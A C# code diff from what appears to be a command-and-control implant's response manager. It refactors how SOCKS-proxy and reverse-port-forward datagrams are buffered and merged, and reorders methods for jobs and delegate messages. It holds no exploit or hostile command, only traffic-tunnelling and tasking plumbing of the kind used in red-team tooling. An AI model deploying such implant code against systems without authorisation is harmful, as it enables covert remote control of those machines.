@@ -1,6 +1,9 @@
 ﻿using Agent.Interfaces;
 using Agent.Models;
+using Agent.Utilities;
+using Renci.SshNet.Common;
 using System.Collections.Concurrent;
+using System.Drawing;
 using System.Text.Json;
 
 namespace Agent.Managers
@@ -11,8 +14,8 @@ namespace Agent.Managers
         private ConcurrentBag<string> responseStrings = new ConcurrentBag<string>();
         private ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
         private ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
-        private ConcurrentBag<ServerDatagram> socksOut = new ConcurrentBag<ServerDatagram>();
-        private ConcurrentBag<ServerDatagram> rpfwdOut = new ConcurrentBag<ServerDatagram>();
+        private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
+        private ConcurrentDictionary<int, ServerDatagram> rpfwdOut = new ConcurrentDictionary<int, ServerDatagram>();
         private ConcurrentBag<InteractMessage> interactiveOut = new ConcurrentBag<InteractMessage>();
         private ConcurrentBag<DelegateMessage> delegateMessages = new ConcurrentBag<DelegateMessage>();
         private ConcurrentDictionary<string, ServerJob> activeJobs = new ConcurrentDictionary<string, ServerJob>();
@@ -30,19 +33,58 @@ namespace Agent.Managers
         {
             throw new NotImplementedException();
         }
+        public async Task AddResponse(DelegateMessage dm)
+        {
+            this.delegateMessages.Add(dm);
+            return;
+        }
+        public async Task AddResponse(InteractMessage im)
+        {
+            this.interactiveOut.Add(im);
+        }
         public async Task AddResponse(DatagramSource source, ServerDatagram dg)
         {
             switch (source)
             {
                 case DatagramSource.Socks5:
-                    socksOut.Add(dg);
+                    AddSocksMessage(dg);
                     break;
                 case DatagramSource.RPortFwd:
-                    rpfwdOut.Add(dg);
+                    AddRpfwdMessage(dg);
                     break;
                 default:
                     break;
             }
+        }
+        private void AddSocksMessage(ServerDatagram dg)
+        {
+            socksOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
+            {
+                // Key exists, update the existing ServerDatagram by adding bdata values
+                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
+                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
+                if (!existingValue.exit && dg.exit)
+                {
+                    existingValue.exit = true;
+                }
+                existingValue.data = Misc.Base64Encode(existingValue.bdata);
+                return existingValue;
+            });
+        }
+        private void AddRpfwdMessage(ServerDatagram dg)
+        {
+            rpfwdOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
+            {
+                // Key exists, update the existing ServerDatagram by adding bdata values
+                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
+                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
+                if (!existingValue.exit && dg.exit)
+                {
+                    existingValue.exit = true;
+                }
+                existingValue.data = Misc.Base64Encode(existingValue.bdata);
+                return existingValue;
+            });
         }
         public async Task AddResponse(ResponseResult res)
         {
@@ -105,7 +147,7 @@ namespace Agent.Managers
         {
             responseStrings.Add(res);
         }
-        public async Task<List<string>> GetTaskResponsesAsync()
+        public List<string> GetTaskResponsesAsync()
         {
             List<string> results = new List<string>();
 
@@ -188,9 +230,10 @@ namespace Agent.Managers
         {
             await WriteLine(output, task_id, completed, "");
         }
-        public Dictionary<string, ServerJob> GetJobs()
+        public void AddJob(ServerJob job)
         {
-            return this.activeJobs.ToDictionary(kvp => kvp.Key, kvp=> kvp.Value,this.activeJobs.Comparer);
+            logger.Log("Adding job with ID: " + job.task.id);
+            this.activeJobs.TryAdd(job.task.id, job);
         }
         public bool TryGetJob(string task_id, out ServerJob job)
         {
@@ -211,19 +254,13 @@ namespace Agent.Managers
                 return false;
             }
         }
+        public Dictionary<string, ServerJob> GetJobs()
+        {
+            return this.activeJobs.ToDictionary(kvp => kvp.Key, kvp => kvp.Value, this.activeJobs.Comparer);
+        }
         public void CompleteJob(string task_id)
         {
             activeJobs.TryRemove(task_id, out _);
-        }
-        public void AddJob(ServerJob job)
-        {
-            logger.Log("Adding job with ID: " + job.task.id);
-            this.activeJobs.TryAdd(job.task.id, job);
-        }
-        public async Task AddResponse(DelegateMessage dm)
-        {
-            this.delegateMessages.Add(dm);
-            return;
         }
         public async Task<string> GetAgentResponseStringAsync()
         {
@@ -232,9 +269,9 @@ namespace Agent.Managers
                 action = "get_tasking",
                 tasking_size = -1,
                 delegates = delegateMessages.ToList(),
-                socks = this.socksOut.ToList(),
-                responses = await this.GetTaskResponsesAsync(),
-                rpfwd = this.rpfwdOut.ToList(),
+                socks = this.socksOut.Values.ToList(),
+                responses = this.GetTaskResponsesAsync(),
+                rpfwd = this.rpfwdOut.Values.ToList(),
                 interactive = this.interactiveOut.ToList(),
             };
 
@@ -291,11 +328,6 @@ namespace Agent.Managers
         public bool StdIsBusy()
         {
             throw new NotImplementedException();
-        }
-
-        public async Task AddResponse(InteractMessage im)
-        {
-            this.interactiveOut.Add(im);
         }
     }
 }
